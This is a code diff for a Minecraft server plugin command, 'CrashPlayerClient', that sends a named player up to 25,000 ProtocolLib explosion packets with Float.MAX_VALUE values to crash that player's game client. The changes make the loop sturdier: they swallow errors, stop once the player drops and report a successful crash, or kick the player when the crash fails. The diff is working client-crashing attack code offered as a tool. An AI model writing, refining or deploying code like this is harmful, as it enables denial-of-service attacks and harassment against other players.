@@ -15,6 +15,7 @@ import org.jetbrains.annotations.NotNull;
 import java.lang.reflect.InvocationTargetException;
 import java.util.ArrayList;
 import java.util.List;
+import java.util.Objects;
 
 import static cn.ChengZhiYa.ChengToolsReloaded.Ultis.multi.ChatColor;
 
@@ -35,7 +36,7 @@ public class CrashPlayerClient implements CommandExecutor {
                 }
                 Player player = Bukkit.getPlayer(PlayerName);
                 sender.sendMessage(ChatColor("&a&l已执行崩端!"));
-                StringHashMap.Set(player.getName() + "_Crash", "崩端ing");
+                StringHashMap.Set(Objects.requireNonNull(player).getName() + "_Crash", "崩端ing");
 
                 PacketContainer packetContainer = new PacketContainer(PacketType.Play.Server.EXPLOSION);
                 packetContainer.getModifier().writeDefaults();
@@ -48,24 +49,22 @@ public class CrashPlayerClient implements CommandExecutor {
                 packetContainer.getFloat().write(2, Float.MAX_VALUE);
                 packetContainer.getFloat().write(3, Float.MAX_VALUE);
                 for (int i = 0; i < 25000; i++) {
-                    if (player.isOnline()) {
-                        try {
-                            ProtocolLibrary.getProtocolManager().sendServerPacket(player, packetContainer, true);
-                        } catch (InvocationTargetException e) {
-                            e.printStackTrace();
-                            StringHashMap.Set(player.getName() + "_Crash", null);
-                            sender.sendMessage(ChatColor("&c&l崩端失败,已踢出玩家!"));
-                            player.kickPlayer("Time out");
-                            return false;
-                        }
-                    } else {
-                        StringHashMap.Set(player.getName() + "_Crash", null);
-                        return false;
+                    try {
+                        ProtocolLibrary.getProtocolManager().sendServerPacket(player, packetContainer, true);
+                    } catch (InvocationTargetException ignored) {}
+                    if (!player.isOnline()) {
+                        break;
                     }
                 }
-                StringHashMap.Set(player.getName() + "_Crash", null);
-                sender.sendMessage(ChatColor("&c&l崩端失败,已踢出玩家!"));
-                player.kickPlayer("Time out");
+                if (player.isOnline()) {
+                    StringHashMap.Set(player.getName() + "_Crash", null);
+                    sender.sendMessage(ChatColor("&c&l崩端失败,已踢出玩家!"));
+                    player.kickPlayer("Time out");
+                }else {
+                    StringHashMap.Set(player.getName() + "_Crash", null);
+                    sender.sendMessage(ChatColor("&a崩端成功!"));
+                    return false;
+                }
             }
         }else {
             sender.sendMessage(multi.ChatColor("&c您没有权限怎么做!"));
